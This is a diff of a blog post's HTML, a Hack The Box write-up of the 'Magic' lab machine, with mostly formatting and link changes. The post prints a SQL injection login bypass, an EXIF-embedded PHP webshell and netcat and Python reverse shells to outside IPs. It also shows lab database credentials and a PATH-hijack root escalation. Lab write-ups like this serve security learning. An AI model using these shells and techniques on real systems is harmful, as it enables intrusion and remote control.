@@ -19,14 +19,14 @@
     <meta property="og:site_name" content="Inês Martins" />
     <meta property="og:type" content="article" />
     <meta property="og:title" content="HTB Write-up | Magic" />
-    <meta property="og:description" content="ScanningAs always, we start with some basic scanning which discloses only an instance of OpenSSH running on port 22 and an Apache web server running on port 80 - pretty typical stuff. ~ nmap -sV -sC -A magic.htb Starting Nmap 7.80 ( https://nmap.org ) at 2020-06-09 15:10 WEST" />
+    <meta property="og:description" content="Retired machine can be found here. ScanningAs always, we start with some basic scanning which discloses only an instance of OpenSSH running on port 22 and an Apache web server running on port 80 - pretty typical stuff. ~ nmap -sV -sC -A magic.htb Starting Nmap 7.80 ( https://nmap." />
     <meta property="og:url" content="https://inesmartins.github.io//dnp-htb-write-up/" />
     <meta property="og:image" content="https://inesmartins.github.io//content/images/2020/08/magic.png" />
     <meta property="article:published_time" content="2020-08-27T12:14:17.000Z" />
-    <meta property="article:modified_time" content="2020-08-27T12:16:21.000Z" />
+    <meta property="article:modified_time" content="2020-09-26T11:33:52.000Z" />
     <meta name="twitter:card" content="summary_large_image" />
     <meta name="twitter:title" content="HTB Write-up | Magic" />
-    <meta name="twitter:description" content="ScanningAs always, we start with some basic scanning which discloses only an instance of OpenSSH running on port 22 and an Apache web server running on port 80 - pretty typical stuff. ~ nmap -sV -sC -A magic.htb Starting Nmap 7.80 ( https://nmap.org ) at 2020-06-09 15:10 WEST" />
+    <meta name="twitter:description" content="Retired machine can be found here. ScanningAs always, we start with some basic scanning which discloses only an instance of OpenSSH running on port 22 and an Apache web server running on port 80 - pretty typical stuff. ~ nmap -sV -sC -A magic.htb Starting Nmap 7.80 ( https://nmap." />
     <meta name="twitter:url" content="https://inesmartins.github.io//dnp-htb-write-up/" />
     <meta name="twitter:image" content="https://inesmartins.github.io//content/images/2020/08/magic.png" />
     <meta name="twitter:label1" content="Written by" />
@@ -65,14 +65,14 @@
     "headline": "HTB Write-up | Magic",
     "url": "https://inesmartins.github.io//dnp-htb-write-up/",
     "datePublished": "2020-08-27T12:14:17.000Z",
-    "dateModified": "2020-08-27T12:16:21.000Z",
+    "dateModified": "2020-09-26T11:33:52.000Z",
     "image": {
         "@type": "ImageObject",
         "url": "https://inesmartins.github.io//content/images/2020/08/magic.png",
         "width": 598,
         "height": 381
     },
-    "description": "\nScanning\nAs always, we start with some basic scanning which discloses only an instance of\nOpenSSH running on port 22 and an Apache web server running on port 80 - pretty\ntypical stuff.\n\n~ nmap -sV -sC -A magic.htb\nStarting Nmap 7.80 ( https://nmap.org ) at 2020-06-09 15:10 WEST\nNmap scan report for magic.htb (10.10.10.185)\nHost is up (0.046s latency).\nNot shown: 998 closed ports\nPORT   STATE SERVICE VERSION\n22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)\n| ssh-",
+    "description": "Retired machine can be found here\n[https://www.hackthebox.eu/home/machines/profile/241].\n\nScanning\nAs always, we start with some basic scanning which discloses only an instance of \nOpenSSH running on port 22 and an Apache web server running on port 80 - pretty\ntypical stuff.\n\n~ nmap -sV -sC -A magic.htb\nStarting Nmap 7.80 ( https://nmap.org ) at 2020-06-09 15:10 WEST\nNmap scan report for magic.htb (10.10.10.185)\nHost is up (0.046s latency).\nNot shown: 998 closed ports\nPORT   STATE SERVICE VERSIO",
     "mainEntityOfPage": {
         "@type": "WebPage",
         "@id": "https://inesmartins.github.io//"
@@ -183,7 +183,7 @@
 
             <section class="post-full-content">
                 <div class="post-content">
-                    <h2 id="scanning"><br>Scanning</h2><p>As always, we start with some basic scanning which discloses only an instance of OpenSSH running on port 22 and an Apache web server running on port 80 - pretty typical stuff.</p><!--kg-card-begin: markdown--><pre><code>~ nmap -sV -sC -A magic.htb
+                    <p><em>Retired machine can be found <a href="https://www.hackthebox.eu/home/machines/profile/241">here</a>.</em></p><h2 id="scanning">Scanning</h2><p>As always, we start with some basic scanning which discloses only an instance of <code>OpenSSH</code> running on port 22 and an <code>Apache</code> web server running on port 80 - pretty typical stuff.</p><!--kg-card-begin: markdown--><pre><code>~ nmap -sV -sC -A magic.htb
 Starting Nmap 7.80 ( https://nmap.org ) at 2020-06-09 15:10 WEST
 Nmap scan report for magic.htb (10.10.10.185)
 Host is up (0.046s latency).
@@ -202,7 +202,7 @@ Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
 Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
 Nmap done: 1 IP address (1 host up) scanned in 9.89 seconds
 </code></pre>
-<!--kg-card-end: markdown--><p>The website is just a simple image gallery, but there is a link to a login form on the bottom left.</p><figure class="kg-card kg-image-card"><img src="https://inesmartins.github.io//content/images/2020/06/main-1.png" class="kg-image"></figure><p>Bypassing authentication was pretty straightforward with SQL Injection - I think this was my first attempt.</p><figure class="kg-card kg-image-card"><img src="https://inesmartins.github.io//content/images/2020/06/login-5.png" class="kg-image"></figure><p>Once the login succeeds, we're redirected to an <a href="http://10.10.10.185/upload.php">Upload</a> page.</p><figure class="kg-card kg-image-card"><img src="https://inesmartins.github.io//content/images/2020/06/upload.png" class="kg-image"></figure><h2 id="bypassing-upload-filters">Bypassing Upload Filters</h2><p>This upload feature only accepts JPG, JPEG or PNG files. This is validated by checking both file extension and MIME type, so uploading a PHP script directly is out of the question. </p><p>To get around these restrictions I ended up following <a href="https://medium.com/bugbountywriteup/hackthebox-networked-93ebbd6a70e3">this</a> tutorial:</p><ol><li>Create a script that lets us execute any command on the machine, with the help of the <a href="https://www.php.net/manual/en/function.passthru.php">passthru</a> function:</li></ol><figure class="kg-card kg-image-card kg-card-hascaption"><img src="https://inesmartins.github.io//content/images/2020/06/image-21.png" class="kg-image"><figcaption>Source: <a href="https://medium.com/bugbountywriteup/hackthebox-networked-93ebbd6a70e3">https://medium.com/bugbountywriteup/hackthebox-networked-93ebbd6a70e3</a></figcaption></figure><p>2. Embed the script in a valid image using <a href="http://steghide.sourceforge.net/">steghide</a>:</p><!--kg-card-begin: markdown--><pre><code>$ steghide embed -cf dog.jpg -ef shell.php
+<!--kg-card-end: markdown--><p>The website is just a simple image gallery, but there is a link to a login form on the bottom left.</p><figure class="kg-card kg-image-card"><img src="https://inesmartins.github.io//content/images/2020/06/main-1.png" class="kg-image"></figure><p>Bypassing authentication was pretty straightforward with <a href="https://owasp.org/www-community/attacks/SQL_Injection">SQL Injection</a> - I think this was my first attempt.</p><figure class="kg-card kg-image-card"><img src="https://inesmartins.github.io//content/images/2020/06/login-5.png" class="kg-image"></figure><p>Once the login succeeds, we're redirected to an <a href="http://10.10.10.185/upload.php">Upload</a> page.</p><figure class="kg-card kg-image-card"><img src="https://inesmartins.github.io//content/images/2020/06/upload.png" class="kg-image"></figure><h2 id="bypassing-upload-filters">Bypassing Upload Filters</h2><p>This upload feature only accepts JPG, JPEG or PNG files. This is validated by checking both file extension and MIME type, so uploading a PHP script directly is out of the question. </p><p>To get around these restrictions I ended up following <a href="https://medium.com/bugbountywriteup/hackthebox-networked-93ebbd6a70e3">this</a> tutorial:</p><ol><li>Create a script that lets us execute any command on the machine, with the help of the <a href="https://www.php.net/manual/en/function.passthru.php">passthru</a> function:</li></ol><figure class="kg-card kg-image-card kg-card-hascaption"><img src="https://inesmartins.github.io//content/images/2020/06/image-21.png" class="kg-image"><figcaption>Source: <a href="https://medium.com/bugbountywriteup/hackthebox-networked-93ebbd6a70e3">https://medium.com/bugbountywriteup/hackthebox-networked-93ebbd6a70e3</a></figcaption></figure><p>2. Embed the script in a valid image using <a href="http://steghide.sourceforge.net/">steghide</a>:</p><!--kg-card-begin: markdown--><pre><code>$ steghide embed -cf dog.jpg -ef shell.php
 </code></pre>
 <!--kg-card-end: markdown--><p>3. Manipulate the EXIF data:</p><!--kg-card-begin: markdown--><pre><code>$ exiftool -Comment='&lt;?php echo &quot;&lt;pre&gt;&quot;; system($_GET['cmd']); ?&gt;' dog.jpg
 </code></pre>
@@ -210,19 +210,19 @@ Nmap done: 1 IP address (1 host up) scanned in 9.89 seconds
 </code></pre>
 <!--kg-card-end: markdown--><p>Finally, we get an RCE, which we use to get a reverse shell:</p><!--kg-card-begin: markdown--><pre><code>http://10.10.10.185/images/uploads/dog.php.jpg?cmd=./nc%2010.10.15.114%204444%20-e%20/bin/sh
 </code></pre>
-<!--kg-card-end: markdown--><h2 id="getting-user">Getting User</h2><p>Authenticated as wwwdata, we start poking around the web server files and find the credentials for the mySQL database, which then allows us to dump the contents of the app's database using the <a href="https://dev.mysql.com/doc/refman/8.0/en/mysqldump.html">mysqldump</a> binary:</p><!--kg-card-begin: markdown--><pre><code>~ /usr/bin/mysqldump --user=theseus --password=iamkingtheseus Magic login &gt; /var/www/Magic/dbdump.sql
+<!--kg-card-end: markdown--><h2 id="getting-user">Getting User</h2><p>Authenticated as <code>wwwdata</code>, we start poking around the web server files and find the credentials for the mySQL database, which then allows us to dump the contents of the app's database using the <a href="https://dev.mysql.com/doc/refman/8.0/en/mysqldump.html">mysqldump</a> binary:</p><!--kg-card-begin: markdown--><pre><code>~ /usr/bin/mysqldump --user=theseus --password=iamkingtheseus Magic login &gt; /var/www/Magic/dbdump.sql
 
 ~ cat /var/www/Magic/dbdump.sq
 ...
 INSERT INTO `login` VALUES (1,'admin','Th3s3usW4sK1ng');
 ...
 </code></pre>
-<!--kg-card-end: markdown--><p>We now have credentials for the user theseus but need to upgrade our shell to be able to authenticate, since SSH access is only enabled with RSA.</p><!--kg-card-begin: markdown--><pre><code>http://10.10.10.185/images/uploads/dog.php.jpg?cmd=/usr/bin/python3 -c 'import pty;import socket,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&quot;10.10.14.52&quot;,4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn(&quot;/bin/bash&quot;)'
+<!--kg-card-end: markdown--><p>We now have credentials for the user <code>theseus</code> but need to upgrade our shell to be able to authenticate, since SSH access is only enabled with RSA.</p><!--kg-card-begin: markdown--><pre><code>http://10.10.10.185/images/uploads/dog.php.jpg?cmd=/usr/bin/python3 -c 'import pty;import socket,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&quot;10.10.14.52&quot;,4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn(&quot;/bin/bash&quot;)'
 </code></pre>
-<!--kg-card-end: markdown--><p>With this interactive shell we can now authenticate via su.</p><!--kg-card-begin: markdown--><pre><code>www-data@ubuntu:/var/www/Magic/images/uploads$ su - theseus
+<!--kg-card-end: markdown--><p>With this interactive shell we can now authenticate via <code>su</code>.</p><!--kg-card-begin: markdown--><pre><code>www-data@ubuntu:/var/www/Magic/images/uploads$ su - theseus
 Password: Th3s3usW4sK1ng
 theseus@ubuntu:~$ </code></pre>
-<!--kg-card-end: markdown--><h2 id="path-to-root">Path to Root</h2><p>Root was a lot more straightforward. We started by running <a href="https://github.com/Anon-Exploiter/SUID3NUM">SUID3NUM</a> which found only one noteworthy file - <strong>/bin/sysinfo</strong> - so we investigate it.</p><!--kg-card-begin: markdown--><pre><code>~ strings /bin/sysinfo
+<!--kg-card-end: markdown--><h2 id="path-to-root">Path to Root</h2><p>Root was a lot more straightforward. We started by running <a href="https://github.com/Anon-Exploiter/SUID3NUM">SUID3NUM</a> which found only one noteworthy file - <code>/bin/sysinfo</code> - so we investigate it.</p><!--kg-card-begin: markdown--><pre><code>~ strings /bin/sysinfo
 ...
 setuid
 ...
@@ -230,13 +230,13 @@ setuid
 lshw -short
 ...
 </code></pre>
-<!--kg-card-end: markdown--><p>As we can see above, the file runs <a href="https://en.wikipedia.org/wiki/Setuid">setuid</a> at one point and right after it prints the output of the <a href="http://manpages.ubuntu.com/manpages/trusty/man1/lshw.1.html">lshw</a> (list hardware) binary. However, there is no path to this binary, which means we can alter the $PATH so that instead of the actual lshw binary, we can get root to run our fake lshw, which prints out the root flag:</p><!--kg-card-begin: markdown--><pre><code>theseus@ubuntu:~$ mkdir /tmp/.abc
+<!--kg-card-end: markdown--><p>As we can see above, the file runs <a href="https://en.wikipedia.org/wiki/Setuid">setuid</a> at one point and right after it prints the output of the <a href="http://manpages.ubuntu.com/manpages/trusty/man1/lshw.1.html">lshw</a> (list hardware) binary. However, there is no path to this binary, which means we can alter the <code>$PATH</code> so that instead of the actual <code>lshw</code> binary, we can get root to run our fake <code>lshw</code>, which prints out the root flag:</p><!--kg-card-begin: markdown--><pre><code>theseus@ubuntu:~$ mkdir /tmp/.abc
 theseus@ubuntu:~$ export PATH=/tmp/.abc:$PATH
 theseus@ubuntu:~$ touch /tmp/.abc/lshw
 theseus@ubuntu:~$ echo &quot;cat /root/root.txt&quot; &gt;&gt; /tmp/.abc/lshw
 theseus@ubuntu:~$ chmod 777 /tmp/.abc/lshw
 </code></pre>
-<!--kg-card-end: markdown--><p>Now, we just need to run the sysinfo binary and in the output there's the root flag instead of the lshw output.</p>
+<!--kg-card-end: markdown--><p>Now, we just need to run the <code>sysinfo</code> binary and in the output there's the root flag instead of the <code>lshw</code> output.</p>
                 </div>
             </section>
 
